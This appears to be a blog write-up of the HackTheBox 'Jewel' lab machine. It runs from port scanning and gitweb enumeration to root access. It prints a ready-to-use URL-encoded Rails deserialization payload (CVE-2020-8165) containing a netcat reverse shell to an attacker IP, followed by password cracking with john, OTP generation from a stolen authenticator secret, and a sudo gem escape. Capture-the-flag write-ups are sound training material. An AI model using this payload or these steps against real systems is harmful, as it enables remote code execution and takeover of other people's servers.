---
date: 2021-02-13 23:48:05
layout: post
title: HackTheBox Jewel Writeup
subtitle: Hackthebox Jewel Writeup
description: >-
  in this blog i've explained how to solve Jewel machine in hackthebox
image: https://i.ibb.co/Q9tCD1K/logo.png
optimized_image: https://i.ibb.co/Q9tCD1K/logo.png
category: hackthebox
tags:
  - hackthebox
  - Jewel
author: Ahmed Fatouh
paginate: true
---

![](https://i.ibb.co/Q9tCD1K/logo.png)

# []()Methodlogy

* Nmap Scan
* Enumerating the web service
* found a version of ruby and exploit of it.
* server side template injection exploitation
* found the password of user bill in /var/backup
* found the secret token of Google Authenticator
* using sudo -l leads us to final part!.

# []()Nmap Scan

> **as always, i’ll do nmap scan to find out which services running in this machine, and i found these services.**

* **22 for ssh service.**
* **8000 for http**
* **8080 for nginx**

> **nmap -Pn -sC -sV -oN scan.txt 10.10.10.211**

```ruby

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: jewel.htb Git
|_Requested resource was http://jewel.htb:8000/gitweb/
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

# []()Web Service Enumeration

* **let's add jewel.htb to our /etc/hosts and start enumerating the web service.**

> **i've found a basic blog on port 8080**

![](https://i.ibb.co/DVznD7p/basic-web-page.png)

* let's sign up and look deeper.

* here i'm logged in.

![](https://i.ibb.co/mXQQNP0/logged-in.png)

> **let's check the port 8000 now.**

![](https://i.ibb.co/D4QSrHB/port-8000.png)

> **it's a .git directory, let's check if there is any good things for us.**

> **click on .git and click on intial commit and yoi will find some Gem files so let's check it.**

![](https://i.ibb.co/CtdbzT0/gem-files.png)

> **in the gem file i found the ruby version**.

![](https://i.ibb.co/WxxZLx9/ruby-version.png)

> **and there's exploit for this version**

* Link: [Ruby On Rils](https://github.com/masahiro331/CVE-2020-8165)

![](https://i.ibb.co/qkHqBD3/ruby-exploit.png)

> **now we need to register a new user and put the payload in the username field to get a reverse shell.**

> **let's register a new user and click on profile and click edit and click save and intercept the request with burpsuite**.

![](https://i.ibb.co/JmP9ZpR/burp-suite.png)

> **put this payload in username filed with changing the IP address.**

* payload: **%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.XX.XX+9001+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T**

* **send the request twice and then refresh the web page.**

* **don't forget to start nc listener.**

![](https://i.ibb.co/R6NFYFC/reverse-shell.png)

* **nice!, we got a reverse shell now.**

# []()Privilege Escalation

> **after some eumeration i found the password of the user bill in /var/backups**

![](https://i.ibb.co/zQJw7YS/cat-comm.png)

![](https://i.ibb.co/pZgZn07/bill-pass.png)

* **let's crack the password now.**

> **sudo john --wordlist=/usr/share/wordlists/rockyou.txt pass**

![](https://i.ibb.co/CHt410K/pass-cracked.png)


> **when you try sudo -l you will see that it's request Verification code.**

![](https://i.ibb.co/93H4Hsy/verify.png)

> **there is a hidden file in home directory of bill which contain a secret token of google authenticator**.

![](https://i.ibb.co/1b18YVs/google-auth.png)

> **so we need to add the google authnticator [GAuth addon](https://chrome.google.com/webstore/detail/gauth-authenticator/ilgcnhelpchnceeipipijaljkblbcobl?hl=en) to google chrome and put the secret token in it and it will generate the OTP for us.**

![](https://i.ibb.co/PZ0CFYh/google-auth-add.png)

* **and here's the OTP**

![](https://i.ibb.co/k0pxQht/otp.png)

> **let's check "sudo -l" again**.

![](https://i.ibb.co/jkqsHQc/operation-not-per.png)

> **in this part i spend a day to identify my mistake but i didn't find anything until my friend told me this machine is all about sync.**

* **let's check the time and the date.**

![](https://i.ibb.co/rc1bfjz/timedatectl.png)

> **it's different date and time from my local date and time, so we need to change it.**

![](https://i.ibb.co/ggJ2g4Q/time-zone-change.png)

* **let' check again**

![](https://i.ibb.co/94QxWM0/bill-gem.png)

> **nice!, we will use gem command to get root ,let's open gtfobins now.**

![](https://i.ibb.co/FHpdq3F/gem-gtfobins.png)

> **sudo gem open -e "/bin/sh -c /bin/sh" rdoc**

![](https://i.ibb.co/q0dGffv/rooted.png)

* **rooted**

* **Thanks For Reading**

* **cheers!**

 <script src="https://www.hackthebox.eu/badge/103789"></script>





